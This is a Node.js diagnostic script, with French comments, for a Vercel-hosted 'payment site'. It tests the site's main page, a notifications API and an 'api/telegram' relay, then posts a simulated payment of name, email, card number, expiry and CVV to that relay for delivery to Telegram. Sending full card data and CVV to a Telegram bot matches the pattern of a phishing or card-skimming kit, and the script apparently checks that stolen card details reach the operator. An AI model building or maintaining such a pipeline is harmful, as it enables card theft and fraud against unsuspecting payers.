const fetch = require('node-fetch');

console.log('üîç DIAGNOSTIC DU SITE DE PAIEMENT');
console.log('=================================');

const CONFIG = {
    SITE_URL: 'https://test-alpha-lac-68.vercel.app',
    TELEGRAM_API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram',
    NOTIFICATIONS_API_URL: 'https://test-alpha-lac-68.vercel.app/api/notifications'
};

// Fonction pour tester la page principale
async function testMainSite() {
    try {
        console.log('üåê Test de la page principale...');
        const response = await fetch(CONFIG.SITE_URL);
        
        if (response.ok) {
            const html = await response.text();
            console.log('‚úÖ Page principale accessible');
            console.log(`üìÑ Taille: ${html.length} caract√®res`);
            
            // V√©rifier si le code de paiement est pr√©sent
            if (html.includes('paiement') || html.includes('payment')) {
                console.log('‚úÖ Code de paiement d√©tect√© dans la page');
            } else {
                console.log('‚ö†Ô∏è  Code de paiement non d√©tect√© dans la page');
            }
            
            // V√©rifier si l'API Telegram est int√©gr√©e
            if (html.includes('api/telegram')) {
                console.log('‚úÖ Int√©gration API Telegram d√©tect√©e');
            } else {
                console.log('‚ö†Ô∏è  Int√©gration API Telegram non d√©tect√©e');
            }
            
            return true;
        } else {
            console.log(`‚ùå Erreur page principale: ${response.status}`);
            return false;
        }
    } catch (error) {
        console.log(`‚ùå Erreur connexion page principale: ${error.message}`);
        return false;
    }
}

// Fonction pour tester l'API Telegram
async function testTelegramAPI() {
    try {
        console.log('üì± Test de l\'API Telegram...');
        
        const testMessage = `üîç TEST DIAGNOSTIC SITE
üìÖ Date: ${new Date().toLocaleString()}
üåê Site: ${CONFIG.SITE_URL}
‚úÖ API Telegram fonctionnelle`;

        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: testMessage,
                type: 'diagnostic'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('‚úÖ API Telegram fonctionnelle');
            console.log(`üì± Message ID: ${result.telegramResponse?.result?.message_id}`);
            return true;
        } else {
            console.log(`‚ùå Erreur API Telegram: ${result.error}`);
            return false;
        }
    } catch (error) {
        console.log(`‚ùå Erreur connexion API Telegram: ${error.message}`);
        return false;
    }
}

// Fonction pour tester l'API Notifications
async function testNotificationsAPI() {
    try {
        console.log('üì® Test de l\'API Notifications...');
        
        const response = await fetch(CONFIG.NOTIFICATIONS_API_URL);
        const data = await response.json();
        
        if (data.success) {
            console.log('‚úÖ API Notifications fonctionnelle');
            console.log(`üìä Notifications stock√©es: ${data.notifications?.length || 0}`);
            return true;
        } else {
            console.log(`‚ùå Erreur API Notifications: ${data.error}`);
            return false;
        }
    } catch (error) {
        console.log(`‚ùå Erreur connexion API Notifications: ${error.message}`);
        return false;
    }
}

// Fonction pour simuler un paiement
async function simulatePayment() {
    try {
        console.log('üí≥ Simulation d\'un paiement...');
        
        const paymentMessage = `üí∞ SIMULATION PAIEMENT DIAGNOSTIC
üë§ Nom: Test Diagnostic
üìß Email: test@diagnostic.com
üí≥ Carte: 1234 **** **** 5678
üìÖ Expiration: 12/25
üîê CVV: 123
üí∂ Montant: 99.99‚Ç¨
üîí V√©rifiez imm√©diatement !`;

        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: paymentMessage,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('‚úÖ Simulation paiement r√©ussie');
            console.log(`üì± Message ID: ${result.telegramResponse?.result?.message_id}`);
            return true;
        } else {
            console.log(`‚ùå Erreur simulation paiement: ${result.error}`);
            return false;
        }
    } catch (error) {
        console.log(`‚ùå Erreur simulation paiement: ${error.message}`);
        return false;
    }
}

// Fonction principale
async function runDiagnostic() {
    console.log('üöÄ D√©marrage du diagnostic...\n');
    
    const results = {
        mainSite: await testMainSite(),
        telegramAPI: await testTelegramAPI(),
        notificationsAPI: await testNotificationsAPI(),
        paymentSimulation: await simulatePayment()
    };
    
    console.log('\nüìä R√âSULTATS DU DIAGNOSTIC');
    console.log('==========================');
    console.log(`üåê Page principale: ${results.mainSite ? '‚úÖ OK' : '‚ùå ERREUR'}`);
    console.log(`üì± API Telegram: ${results.telegramAPI ? '‚úÖ OK' : '‚ùå ERREUR'}`);
    console.log(`üì® API Notifications: ${results.notificationsAPI ? '‚úÖ OK' : '‚ùå ERREUR'}`);
    console.log(`üí≥ Simulation paiement: ${results.paymentSimulation ? '‚úÖ OK' : '‚ùå ERREUR'}`);
    
    const allWorking = Object.values(results).every(result => result);
    
    if (allWorking) {
        console.log('\nüéâ TOUT FONCTIONNE CORRECTEMENT !');
        console.log('üí° Si les paiements ne marchent pas sur votre site, v√©rifiez :');
        console.log('   - Le cache de votre navigateur (Ctrl+F5 ou Cmd+Shift+R)');
        console.log('   - La console JavaScript (F12) pour des erreurs');
        console.log('   - Que le formulaire de paiement est bien rempli');
    } else {
        console.log('\n‚ö†Ô∏è  CERTAINS √âL√âMENTS NE FONCTIONNENT PAS');
        console.log('üí° V√©rifiez les erreurs ci-dessus et contactez le support si n√©cessaire');
    }
}

// Ex√©cuter le diagnostic
runDiagnostic().catch(console.error);
